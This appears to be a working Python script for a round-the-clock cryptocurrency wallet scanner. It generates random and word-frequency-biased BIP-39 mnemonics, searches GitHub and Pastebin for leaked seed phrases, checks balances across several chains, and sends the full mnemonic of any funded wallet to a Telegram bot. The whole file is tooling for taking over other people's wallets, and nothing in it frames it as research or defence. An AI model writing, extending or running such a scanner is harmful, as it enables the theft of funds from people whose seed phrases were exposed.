#!/usr/bin/env python3
"""24/7 Crypto Balance Scanner — random mnemonic scanning with Telegram alerts.

Runs continuously, generating random BIP-39 mnemonics and checking balances
across BTC/ETH/BSC/Polygon/SOL. Sends Telegram notification on any hit (balance > 0).

Usage:
    python run_scanner.py                  # Run with defaults (20 workers)
    python run_scanner.py --workers 50     # Custom worker count
    python run_scanner.py --duration 3600  # Run for 1 hour, then stop
"""

import argparse
import asyncio
import logging
import os
import signal
import sys
import time
from datetime import datetime, timezone

import httpx

# --- Load .env if present ---
def _load_dotenv(path: str = ".env") -> None:
    if not os.path.exists(path):
        return
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, _, value = line.partition("=")
            os.environ.setdefault(key.strip(), value.strip())

_load_dotenv()

# --- Config ---
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
LOG_LEVEL = os.environ.get("LOG_LEVEL", "INFO")
LOG_FILE = os.environ.get("LOG_FILE", "scanner.log")

# --- Logging ---
logging.basicConfig(
    level=getattr(logging, LOG_LEVEL.upper(), logging.INFO),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(LOG_FILE, mode="a"),
    ],
)
logger = logging.getLogger("scanner")


async def send_telegram_alert(message: str) -> bool:
    """Send a Telegram notification. Returns True on success."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logger.warning("Telegram not configured (missing token or chat_id)")
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        async with httpx.AsyncClient(timeout=15) as client:
            resp = await client.post(url, json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "Markdown",
            })
            resp.raise_for_status()
            logger.info("Telegram alert sent successfully")
            return True
    except Exception as e:
        logger.error("Telegram alert failed: %s", e)
        return False


def format_hit_alert(mnemonic: str, addresses: list, balances: list) -> str:
    """Format a hit into a Telegram alert message."""
    lines = ["🪙 *WALLET WITH BALANCE FOUND!*", ""]
    lines.append(f"*Mnemonic:* `{mnemonic}`")
    lines.append("")
    for _, bal in zip(addresses, balances):
        if bal and bal.get("balance", 0) > 0:
            lines.append(
                f"*{bal['chain']}*: `{bal['balance']:.8f}` {bal['symbol']}"
            )
            if bal.get("usd_value", 0) > 0:
                lines.append(f"  (~${bal['usd_value']:,.2f})")
            lines.append(f"  Address: `{bal['address']}`")
            lines.append("")
    lines.append(f"⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
    return "\n".join(lines)


async def run_smart_generator_loop(interval: int = 300) -> None:
    """Run the AI word-frequency biased smart generator periodically.

    Generates BIP-39 valid mnemonics biased by word frequency analysis,
    checks balances, and sends Telegram alerts on confirmed hits.
    """
    from src.modules.crypto.balance.ai_analyzer import WordFrequencyAnalyzer
    from src.modules.crypto.balance.smart_generator import SmartMnemonicGenerator
    from src.modules.crypto.balance.scanner_coordinator import ScannerCoordinator
    from src.modules.crypto.balance.chains import ALL_CHAINS, CHAIN_MAP
    from src.modules.crypto.balance.deriver import derive_from_mnemonic
    from src.modules.crypto.balance.hit_logger import HitLogger

    hit_logger = HitLogger(
        db_path="wallet_hits.db",
        telegram_token=TELEGRAM_BOT_TOKEN,
        telegram_chat_id=TELEGRAM_CHAT_ID,
    )
    await hit_logger.start()

    coordinator = ScannerCoordinator(chains=list(ALL_CHAINS))
    await coordinator.start()

    analyzer = WordFrequencyAnalyzer()
    analyzer.load_from_db()
    generator = SmartMnemonicGenerator(analyzer)

    logger.info("Smart generator started (interval: %ds)", interval)

    while True:
        try:
            logger.info("Smart generator: starting generation cycle")

            for _ in range(50):  # Generate 50 mnemonics per cycle
                mnemonic = generator.generate()
                if coordinator.is_mnemonic_seen(mnemonic):
                    continue
                coordinator.mark_mnemonic_seen(mnemonic, source="smart")

                addresses = derive_from_mnemonic(mnemonic, chains=list(ALL_CHAINS), count=1)
                for addr in addresses:
                    chain_cfg = CHAIN_MAP.get(addr.chain.lower())
                    if chain_cfg is None:
                        continue
                    result = await coordinator.check_balance(
                        addr.address, chain_cfg, addr.derivation_path,
                    )
                    if result.balance > 0:
                        mnemonic_hash = ScannerCoordinator.hash_mnemonic(mnemonic)
                        await hit_logger.log_hit(
                            address=addr.address,
                            chain=addr.chain,
                            balance=result.balance,
                            usd_value=result.usd_value,
                            mnemonic_hash=mnemonic_hash,
                            derivation_path=addr.derivation_path,
                            source="smart_scan",
                        )
                        msg = (
                            "🤖 *SMART GENERATOR HIT!*\n\n"
                            f"*Mnemonic:* `{mnemonic}`\n\n"
                            f"*{addr.chain}*: `{result.balance:.8f}` {addr.symbol}\n"
                            f"  Address: `{addr.address}`\n"
                            f"\n⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
                        )
                        await send_telegram_alert(msg)
                        logger.info("Smart generator: CONFIRMED HIT!")

            logger.info("Smart generator: cycle complete, sleeping %ds", interval)

        except Exception as e:
            logger.error("Smart generator error: %s", e)

        await asyncio.sleep(interval)


async def run_leak_scanner_loop(interval: int = 3600) -> None:
    """Run the leak scanner periodically (default: every hour).

    Scans GitHub and Pastebin for leaked mnemonics, verifies balances,
    and sends Telegram alerts on confirmed hits.
    """
    from src.modules.crypto.balance.leak_scanner import (
        GitHubLeakScanner,
        PasteSiteScanner,
        verify_and_alert,
    )
    from src.modules.crypto.balance.chains import ALL_CHAINS
    from src.modules.crypto.balance.hit_logger import HitLogger

    github_token = os.environ.get("GITHUB_TOKEN", "")
    hit_logger = HitLogger(
        db_path="wallet_hits.db",
        telegram_token=TELEGRAM_BOT_TOKEN,
        telegram_chat_id=TELEGRAM_CHAT_ID,
    )

    github_scanner = GitHubLeakScanner(github_token=github_token, hit_logger=hit_logger)
    paste_scanner = PasteSiteScanner(hit_logger=hit_logger)

    logger.info("Leak scanner started (interval: %ds)", interval)

    while True:
        try:
            logger.info("Leak scanner: starting scan cycle")

            # GitHub scan
            github_findings = await github_scanner.scan(max_results=30)
            logger.info("Leak scanner: GitHub found %d candidates", len(github_findings))

            for finding in github_findings:
                result = await verify_and_alert(
                    finding.mnemonic_candidate,
                    chains=list(ALL_CHAINS),
                    hit_logger=hit_logger,
                    count=6,
                    source="github",
                )
                if result and result.has_balance:
                    msg = (
                        "🔍 *LEAK SCANNER HIT (GitHub)!*\n\n"
                        f"*Source:* {finding.source_url}\n"
                        f"*Mnemonic:* `{finding.mnemonic_candidate}`\n\n"
                    )
                    for chain, details in result.balance_details.items():
                        msg += f"*{chain}*: `{details['balance']:.8f}` {details['symbol']}\n"
                        msg += f"  Address: `{details['address']}`\n"
                    msg += f"\n⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
                    await send_telegram_alert(msg)
                    logger.info("Leak scanner: CONFIRMED HIT from GitHub!")

            # Pastebin scan
            paste_findings = await paste_scanner.scan(max_pastes=30)
            logger.info("Leak scanner: Pastebin found %d candidates", len(paste_findings))

            for finding in paste_findings:
                result = await verify_and_alert(
                    finding.mnemonic_candidate,
                    chains=list(ALL_CHAINS),
                    hit_logger=hit_logger,
                    count=6,
                    source="pastebin",
                )
                if result and result.has_balance:
                    msg = (
                        "🔍 *LEAK SCANNER HIT (Pastebin)!*\n\n"
                        f"*Source:* {finding.source_url}\n"
                        f"*Mnemonic:* `{finding.mnemonic_candidate}`\n\n"
                    )
                    for chain, details in result.balance_details.items():
                        msg += f"*{chain}*: `{details['balance']:.8f}` {details['symbol']}\n"
                        msg += f"  Address: `{details['address']}`\n"
                    msg += f"\n⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
                    await send_telegram_alert(msg)
                    logger.info("Leak scanner: CONFIRMED HIT from Pastebin!")

            logger.info("Leak scanner: scan cycle complete, sleeping %ds", interval)

        except Exception as e:
            logger.error("Leak scanner error: %s", e)

        await asyncio.sleep(interval)


async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
    """Run the random scanner continuously with Telegram alerts on hits."""
    from src.modules.crypto.balance.scanner_engine import RandomScanner
    from src.modules.crypto.balance.chains import ALL_CHAINS
    from src.modules.crypto.balance.hit_logger import HitLogger

    logger.info("=" * 60)
    logger.info("  24/7 Crypto Balance Scanner Starting")
    logger.info("=" * 60)
    logger.info(f"  Workers:      {workers}")
    logger.info(f"  Chains:       {', '.join(c.symbol for c in ALL_CHAINS)}")
    logger.info(f"  Duration:     {duration}s" if duration else "  Duration:     unlimited")
    logger.info(f"  Leak Scanner: enabled (every 3600s)")
    logger.info(f"  Smart Generator: enabled (every 300s)")
    logger.info(f"  Telegram:     {'configured' if TELEGRAM_BOT_TOKEN else 'NOT configured'}")
    logger.info(f"  Log file:     {LOG_FILE}")
    logger.info("=" * 60)

    # Send startup notification
    await send_telegram_alert(
        "🚀 *Crypto Balance Scanner Started*\n\n"
        f"Workers: {workers}\n"
        f"Chains: {', '.join(c.symbol for c in ALL_CHAINS)}\n"
        f"Leak Scanner: every 1h\n"
        f"Smart Generator: every 5m\n"
        f"Duration: {'unlimited' if duration else f'{duration}s'}"
    )

    # Create hit logger with alert callback
    hit_logger = HitLogger(
        db_path="wallet_hits.db",
        telegram_token=TELEGRAM_BOT_TOKEN,
        telegram_chat_id=TELEGRAM_CHAT_ID,
    )

    # Create scanner
    scanner = RandomScanner(
        workers=workers,
        chains=list(ALL_CHAINS),
        hit_logger=hit_logger,
    )

    # Graceful shutdown
    shutdown_event = asyncio.Event()
    loop = asyncio.get_running_loop()

    def _signal_handler():
        logger.info("Shutdown signal received, stopping gracefully...")
        shutdown_event.set()
        scanner._shutdown = True

    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, _signal_handler)

    # Override scanner's stop event
    scanner.__dict__["_stop_event"] = shutdown_event

    start_time = time.monotonic()

    # Start leak scanner and smart generator as background tasks
    leak_task = asyncio.create_task(run_leak_scanner_loop(interval=3600))
    smart_task = asyncio.create_task(run_smart_generator_loop(interval=300))
    logger.info("Leak scanner + smart generator background tasks started")

    try:
        stats = await scanner.run(duration_sec=duration)
    except Exception as e:
        logger.error("Scanner crashed: %s", e)
        await send_telegram_alert(f"❌ *Scanner crashed:*\n`{e}`")
        raise
    finally:
        leak_task.cancel()
        smart_task.cancel()
        try:
            await leak_task
        except asyncio.CancelledError:
            pass
        try:
            await smart_task
        except asyncio.CancelledError:
            pass

    elapsed = time.monotonic() - start_time
    logger.info("=" * 60)
    logger.info("  Scanner Stopped")
    logger.info("=" * 60)
    logger.info(f"  Elapsed:         {elapsed:.1f}s")
    logger.info(f"  Mnemonics:       {stats.mnemonics_generated}")
    logger.info(f"  Addresses:       {stats.addresses_checked}")
    logger.info(f"  Hits:            {stats.hits_found}")
    logger.info(f"  API errors:      {stats.api_errors}")
    logger.info(f"  Throughput:      {stats.mnemonics_per_sec:.1f}/sec")
    logger.info("=" * 60)

    # Send shutdown notification
    await send_telegram_alert(
        "⏹ *Crypto Balance Scanner Stopped*\n\n"
        f"Duration: {elapsed:.0f}s\n"
        f"Mnemonics: {stats.mnemonics_generated}\n"
        f"Addresses: {stats.addresses_checked}\n"
        f"Hits: {stats.hits_found}\n"
        f"Throughput: {stats.mnemonics_per_sec:.1f}/sec"
    )


def main() -> None:
    parser = argparse.ArgumentParser(description="24/7 Crypto Balance Scanner")
    parser.add_argument("--workers", type=int, default=20, help="Number of async workers (default: 20)")
    parser.add_argument("--duration", type=int, default=None, help="Duration in seconds (default: unlimited)")
    args = parser.parse_args()

    try:
        asyncio.run(run_scanner(workers=args.workers, duration=args.duration))
    except KeyboardInterrupt:
        logger.info("Interrupted by user")
    except Exception as e:
        logger.error("Fatal error: %s", e)
        sys.exit(1)


if __name__ == "__main__":
    main()
